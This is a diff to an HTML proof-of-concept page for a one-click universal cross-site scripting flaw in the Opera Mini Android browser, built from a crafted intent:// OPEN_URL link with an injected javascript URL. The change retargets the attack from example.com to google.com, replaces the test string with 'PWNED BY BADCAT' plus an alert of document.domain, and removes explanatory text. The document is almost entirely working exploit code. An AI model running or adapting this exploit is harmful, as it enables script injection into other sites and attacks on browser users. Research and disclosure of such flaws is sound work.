@@ -16,18 +16,18 @@
   <script>
     const params = new URLSearchParams(location.search);
     const app = document.querySelector('#app');
-    const exploit = 'intent://open/#Intent;action=com.opera.android.action.OPEN_URL;S.action_open_url=javascript%3Adocument.write%2528%2527test%2527%2529%253Balert%2528%2527OPEN_URL_UXSS_%2527%252Blocation.origin%2529;B.action_new_tab=false;B.action_inject_startpage=false;SEL;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;scheme=https;package=com.opera.mini.native;end';
+    const exploit = 'intent://open/#Intent;action=com.opera.android.action.OPEN_URL;S.action_open_url=javascript%3Adocument.write%2528%2527PWNED%2520BY%2520BADCAT%2527%2529%253Balert%2528%252Bdocument.domain%2529;B.action_new_tab=false;B.action_inject_startpage=false;SEL;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;scheme=https;package=com.opera.mini.native;end';
 
     if (params.get('stage') === 'bounce') {
-      app.innerHTML = '<h1>Restoring target&hellip;</h1><p>The proof now returns to the pristine cross-origin history entry.</p>';
+      app.innerHTML = '<h1>UXSS</h1>';
       setTimeout(() => {
         location.href = exploit;
         history.back();
       }, 900);
     } else {
-      app.innerHTML = '<h1>OPEN_URL cross-origin UXSS</h1><p>One tap runs the complete proof against <code>https://example.com</code>.</p><button id="run" type="button">RUN ONE-CLICK POC</button><pre id="status"></pre>';
+      app.innerHTML = '<h1>OPEN_URL UXSS</h1><button id="run" type="button">RUN ONE-CLICK POC</button><pre id="status"></pre>';
       document.querySelector('#run').onclick = () => {
-        const target = 'https://example.com/?open_url_uxss_seed=' + Date.now();
+        const target = 'https://www.google.com/';
         const victim = window.open(target, 'openUrlUxssVictim');
         if (!victim) {
           document.querySelector('#status').textContent = 'POPUP BLOCKED: allow popups for this origin and retry.';
@@ -39,7 +39,7 @@
         bounce.search = '';
         bounce.searchParams.set('stage', 'bounce');
         bounce.searchParams.set('t', String(Date.now()));
-        setTimeout(() => { victim.location.href = bounce.href; }, 6000);
+        setTimeout(() => { victim.location.href = bounce.href; }, 3000);
       };
     }
   </script>
